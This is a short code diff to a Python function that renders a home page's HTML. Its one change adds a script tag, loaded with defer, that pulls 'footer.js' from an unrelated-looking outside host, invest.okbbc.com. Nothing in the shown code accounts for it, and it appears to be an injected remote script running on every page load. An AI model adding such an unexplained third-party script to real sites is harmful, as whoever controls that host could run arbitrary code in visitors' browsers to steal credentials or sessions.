@@ -460,6 +460,7 @@ def render_home_page(payload: dict[str, Any]) -> str:
       </table>
     </section>
   </main>
+  <script src="https://invest.okbbc.com/footer.js" defer></script>
 </body>
 </html>
 """
